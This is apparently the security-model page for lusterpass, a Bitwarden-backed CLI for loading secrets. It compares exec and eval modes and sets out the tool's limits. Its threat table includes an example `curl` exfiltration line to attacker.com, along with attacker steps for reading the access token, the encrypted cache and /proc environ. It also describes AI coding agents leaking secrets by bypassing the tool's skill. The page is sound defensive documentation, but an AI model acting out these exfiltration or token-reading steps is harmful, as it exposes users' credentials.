---
title: Security model
description: What lusterpass defends against, what it doesn't, and how each execution path actually works.
---

# Security model

This page is for users who want to understand precisely what lusterpass does and does not protect — and how to choose between `exec`, `eval`, and (avoid) raw `env` in your own threat model. It is deliberately blunt about limitations.

> **Both `lusterpass exec` and `eval "$(lusterpass env)"` are first-class supported and not deprecated.** This document helps you pick the right one for your situation, not migrate away from either. If `eval` works for you, keep using it. `exec` exists for stricter privacy in one-shot command runs and for cases where you don't want secrets in your parent shell — read on for the trade-offs.

If you are looking for setup or usage instructions, see [Bitwarden setup](bitwarden-setup.html) and the [README](https://github.com/lustertools/lusterpass#quickstart). This document assumes you already know the basics.

---

## Threat model in one sentence

Lusterpass narrows the surface where secrets are *visible* — to AI coding agents, to your shell history, to checked-in files, to CI logs — without changing the surface where secrets *exist* (your machine's memory and disk under your user account).

## What lusterpass defends against

| Threat | Defense |
|---|---|
| AI coding agent reads `.env` and the values flow into LLM prompt cache, transcript, or vendor telemetry | Secrets never live in a checked-in file. The agent loads them via `lusterpass exec` (no stdout) or `eval "$(lusterpass env)"` (captured pipe). The shipped agent skill enforces this. |
| Secret accidentally committed to git inside a `.env` or `.envrc` | The committed file is `.lusterpass.yaml` — names only, never values. Git blame on this file reveals nothing sensitive. |
| Secret value appears in a CI job's plaintext logs (e.g. `printenv` output, `set -x` traces, error reports) | If your CI uses `lusterpass exec -- ./script`, the values exist only in the child process's address space and are never echoed by lusterpass itself. CI log capture must explicitly print the env (which is the same risk as any secret store). |
| Per-project Doppler / Infisical / 1Password subscription cost | Bitwarden Secrets Manager has a usable free tier (unlimited secrets, 2 users, 3 projects, 3 machine accounts at $0/mo). |
| User typo'd `lusterpass env` and dumped values to terminal scrollback | The TTY guard (since v0.2.0) refuses to print to a terminal and points the user at `eval` or `exec`. |
| Cache file at rest readable by other users on the same machine | Cache file is encrypted with a key derived from the access token. Another user without the token sees ciphertext. |

## What lusterpass does NOT defend against

| Threat | Why not |
|---|---|
| An attacker with shell access **as your user** | The attacker can `cat ~/.lusterpass/accounts/<n>/token`, decrypt the cache directly, attach a debugger to a running process, read `/proc/$pid/environ` (Linux), or `printenv` after you've eval'd. Lusterpass cannot defend against the user account being compromised. |
| Secrets persisting in your shell after `eval "$(lusterpass env)"` | They will. `eval` literally writes the values into your shell's environment table and they remain until the shell exits. To avoid this, use `lusterpass exec` instead. |
| A child process intentionally logging or transmitting the env values it receives | Lusterpass cannot inspect what your script does with the secrets. If `./script.sh` runs `curl -d "pass=$DB_PASSWORD" attacker.com`, that's on `./script.sh`. |
| Core dumps, kernel crash dumps, or hibernation files containing process memory | These can contain secret values from any running process. OS-level defense (disable core dumps, encrypt swap) is required. |
| An AI agent that ignores the `lusterpass` skill and runs `lusterpass env` without `eval` | The TTY guard catches the human-typo case but agent stdin/stdout is usually a pipe (looks identical to `eval`), so the guard does **not** save you here. The skill is the defense; if the skill isn't installed or the agent ignores it, this leak is possible. |
| Bitwarden Secrets Manager being compromised | Lusterpass is downstream of Bitwarden. If Bitwarden has a breach, your secrets are exposed regardless of how lusterpass is configured. |
| The `.lusterpass.yaml` reference *names* leaking sensitive metadata | If you name a secret `acme-prod-stripe-webhook-signing-key--myapp`, that name is committed to git. The structure of your secret namespace becomes public if your repo is public. Use generic names if this matters. |

The first row is the most important: **lusterpass does not aim to defend against an attacker who has already compromised your user account on the machine.** Every meaningful path to your secrets remains open to such an attacker. This is the same property as `direnv`, `op`, `doppler`, `chamber`, `aws-vault`, and every other dev-machine secret tool. If you need protection against local compromise, you need hardware-backed key storage (TPM, Secure Enclave, YubiKey) and a different category of tool.

---

## Three ways to consume secrets

Lusterpass offers three execution paths. They have **very different** safety properties. Pick deliberately.

### 1. `lusterpass exec -- <command>` — recommended for most cases

```bash
lusterpass exec -- ./run-migrations.sh
lusterpass exec --profile prod -- npm test
```

**What happens:**
1. Lusterpass loads its config and decrypts the cache.
2. It builds the merged environment (shell + config vars + secrets).
3. **Unix:** lusterpass calls `execve(2)`, which replaces its own process image with the target command. There is no lusterpass process during the run; the target command's PID is what lusterpass's PID was.
4. **Windows:** lusterpass forks the target as a child, forwards SIGINT/SIGTERM, and exits with the child's exit code.

**Where the secret values live:**
- Briefly in lusterpass's heap (~5 ms between cache decryption and execve)
- In the child process's address space (the `envp` argument of execve, plus the C runtime's `environ` array)
- Reachable via `/proc/$pid/environ` (Linux) for processes you own
- **Never** in your shell's environment, your shell's history, lusterpass's stdout/stderr, or any file lusterpass writes

**Use when:** running a single command, a test suite, a deploy script, a long-running training job, an integration test. Most cases.

**Strictly stronger privacy than `eval`** — your shell's environment is unchanged after the run.

### 2. `eval "$(lusterpass env)"` — for direnv and "load into shell"

```bash
eval "$(lusterpass env)"        # current shell now has the vars
./script.sh                      # inherits them via fork
node app.js                      # also inherits
```

**What happens:**
1. `lusterpass env` prints `export KEY='value'` lines to stdout. Stdout is the captured pipe of `$(...)`, not a terminal.
2. The shell `eval`s those lines, which is equivalent to typing them — your shell's environment now contains the values.
3. Anything you launch from this shell inherits the env.

**Where the secret values live:**
- In your shell's environment table
- Inherited by every subprocess you launch from this shell
- Reachable by `printenv`, `env`, debuggers attaching to your shell, anyone reading `/proc/$$/environ`
- **Persist until you exit the shell**

**Use when:** integrating with [direnv](https://direnv.net/) (where the `eval` is automatically done in `.envrc`), or when you want a long interactive session with secrets available to multiple commands you'll type.

**Cost vs. `exec`:** secrets persist in your shell. If you forget you eval'd and accidentally `printenv` or post your terminal scrollback to a chat, they leak.

### 3. `lusterpass env` (raw, without `eval`) — blocked by default

```bash
$ lusterpass env
Error: refusing to print secret values directly to a terminal.
This would expose values to your terminal scrollback, your shell history,
or an AI agent's transcript. Use one of the safe forms instead:

  eval "$(lusterpass env)"            # load into the current shell
  lusterpass exec -- <command>        # run a single command with secrets
```

The TTY guard (added in v0.2.0) makes this an error when stdout is an interactive terminal. The guard does *not* fire when stdout is a pipe (eval, direnv, an agent's command capture) or a file redirect. **Important caveat:** an AI agent's command capture often uses a pipe, which the guard cannot distinguish from `eval`. The guard catches human typos, not misbehaving agents — that's the skill's job.

**Use when:** essentially never as a normal flow. The legitimate niche is debugging the cache, writing your own custom shell pipeline, or piping to a file deliberately (`lusterpass env > /tmp/snapshot` — works because file redirect is not a TTY). If you don't have a specific reason, use `exec` or `eval` instead.

---

## Comparison table

| Property | `exec` | `eval $(env)` | raw `env` |
|---|---|---|---|
| Secrets enter parent shell environment | No | **Yes** | Yes, plus stdout |
| Secrets printed to terminal/transcript | Never | Never (captured pipe) | **Yes** unless a redirect or pipe |
| Persist after the operation | Until child exits | **Until shell exits** | n/a (was on screen) |
| Memory overhead during run (Unix) | 0 (process replaced) | 0 (no parent process) | n/a |
| Required for direnv | No | Yes | No |
| Recommended default | **Yes** | For direnv only | No, blocked by TTY guard |
| Safe with AI coding agents | Yes | Yes | **No** — leaks into transcript |

---

## What lives where on disk

| Path | Contents | Encrypted? | Mode |
|---|---|---|---|
| `.lusterpass.yaml` (in your project root) | Project name, profile names, var names and values (non-secret), secret reference names (the Bitwarden lookup keys, **not** the values) | Plaintext | 0644, intended for git |
| `~/.lusterpass/accounts/<n>/token` | Bitwarden access token for this account | Plaintext | 0600 |
| `~/.lusterpass/accounts/<n>/org` | Default Bitwarden organization ID | Plaintext | 0600 |
| `~/.lusterpass/accounts/<n>/cache/<project>/<key>.enc` | Resolved secret values for one (project, profile) tuple | Encrypted (AES-GCM, key derived from access token) | 0600 |
| `~/.lusterpass/accounts/<n>/active` | Marker for which account is currently active | Plaintext | 0600 |

The cache file is encrypted, but **its decryption key is the access token in the same directory**. An attacker who reads one can decrypt the other. This is intentional: the cache encryption protects against casual disk inspection by other users on the machine and against malware that reads `~/.lusterpass/cache/*` looking for plaintext patterns. It does **not** protect against an attacker who can read your home directory in full.

---

## Process mechanics for `exec` (Unix)

This is the precise sequence, useful if you're auditing the tool or explaining it to your security team.

```
Step 1: Shell prompt
  PID 4001  ← your shell

Step 2: Shell forks lusterpass to handle the command
  PID 4001  ← shell (waiting on PID 4321)
  PID 4321  ← lusterpass exec -- ./script

Step 3: Lusterpass reads config, decrypts cache, builds new env

Step 4: Lusterpass calls syscall.Exec — the kernel replaces PID 4321's
        program image with ./script
  PID 4001  ← shell (still waiting on PID 4321)
  PID 4321  ← now running ./script with the secrets in its env
              (the lusterpass binary is no longer mapped into this process)

Step 5: ./script runs to completion
  PID 4321 terminates with some exit code

Step 6: Shell reaps PID 4321, sees ./script's exit code
```

Verifiable claims about Step 5 (during the run):
- `ps aux | grep lusterpass` returns nothing — there is no lusterpass process
- `cat /proc/4321/comm` (Linux) outputs `script` (or whatever the target was), not `lusterpass`
- `cat /proc/4321/exe` (Linux) symlinks to `./script`, not the lusterpass binary
- Memory consumption of PID 4321 is whatever `./script` uses; the ~10 MB Go binary heap is reclaimed by the kernel during execve
- `kill 4321` kills `./script`. Lusterpass cannot intercept signals because it doesn't exist.

On Windows, `exec.Cmd.Run()` is used instead — lusterpass remains alive as the parent (~5–10 MB resident) for the duration. Stdio passthrough and SIGINT/SIGTERM forwarding are explicit. Functionally equivalent to the user; mechanically a fork-and-wait rather than a process replacement.

---

## Known footguns and what we do about them

### F1. `lusterpass env` printing to a terminal
Mitigation: TTY guard (v0.2.0+). Refuses to print, points user at safe alternatives. Caveat: doesn't catch agent command capture, which is a pipe.

### F2. `eval "$(lusterpass env)"` then `printenv` later
Mitigation: documentation. The values *are* in your shell after eval, by design. If this is a problem, use `exec` instead — secrets never enter your shell.

### F3. AI agent reads `~/.lusterpass/cache/*` directly with the token
Mitigation: the shipped agent skill explicitly forbids reading anything under `~/.lusterpass/`. This is a documentation defense, not enforcement. A misbehaving agent could ignore it.

### F4. Subprocess logs the secrets it receives
Mitigation: none at the lusterpass layer. Audit your scripts. Don't pass secrets to processes you don't trust.

### F5. CI job sets `set -x` and traces every command
Mitigation: don't do this in production CI. If you need command tracing, mask values yourself: `set +x; ./run-with-secrets; set -x`. Lusterpass's `exec` mode means your CI logs only see the *invocation* `lusterpass exec -- ./script`, never the values that go into the child's env.

### F6. Core dumps and crash reports
Mitigation: OS-level. `ulimit -c 0`, encrypted swap. Out of lusterpass's reach.

### F7. The reference names in `.lusterpass.yaml` reveal vault structure
Mitigation: be deliberate about names. Generic (`db-pass--prod`) is safer in public repos than identifying (`acme-stripe-prod-key--customer-portal`).

---

## Comparison to alternatives

| Tool | Backend | `exec`-style | `eval`-style | Agent-safe positioning |
|---|---|---|---|---|
| **lusterpass** | Bitwarden Secrets Manager | Yes (`exec`) | Yes (`env`) | Yes (the shipped skill, TTY guard) |
| direnv | Plain `.envrc` files | No | Yes (auto-eval on cd) | No |
| sops | Encrypted YAML/JSON files | No (manual) | No | No |
| op (1Password CLI) | 1Password vault | Yes (`op run`) | Yes (`op item`) | Implicit — not a project goal |
| doppler | Doppler SaaS | Yes (`doppler run`) | Yes (`doppler secrets download`) | Implicit |
| chamber | AWS Parameter Store | Yes (`chamber exec`) | No (only fetch) | Implicit |
| aws-vault | AWS credentials only | Yes (`aws-vault exec`) | No | n/a |
| HashiCorp Vault CLI | Vault server | Yes-ish (`vault exec`) | Yes (`vault read`) | No |

Lusterpass's specific position: free-tier Bitwarden as the backend (no SaaS subscription), explicit agent-safe story (the skill + TTY guard), and the same `exec`/`eval` mechanic everyone else converged on for shell integration. There's no novel cryptography here — that's a feature, not a bug.

---

## Recommendations

For the average dev-workstation or CI use case:

1. Use `lusterpass exec -- <command>` as your default for running anything that needs secrets.
2. Use `eval "$(lusterpass env)"` only when integrating with direnv or running an extended interactive session.
3. Never use `lusterpass env` on its own. The TTY guard will block it; if you find yourself wanting to bypass the guard, you probably want `exec` or `eval` instead.
4. Keep `.lusterpass.yaml` in git. Keep `~/.lusterpass/` out of git, out of backups that aren't encrypted, and off shared machines.
5. Install the shipped agent skill into your AI coding agent's skill directory if you're letting an agent run commands that need secrets.
6. Don't log into a Bitwarden account that has more access than the project needs. Use a per-project machine account when possible.

If your threat model includes local compromise, lusterpass is the wrong tool. Look at hardware-backed solutions (Secure Enclave / TPM / YubiKey-backed agents).
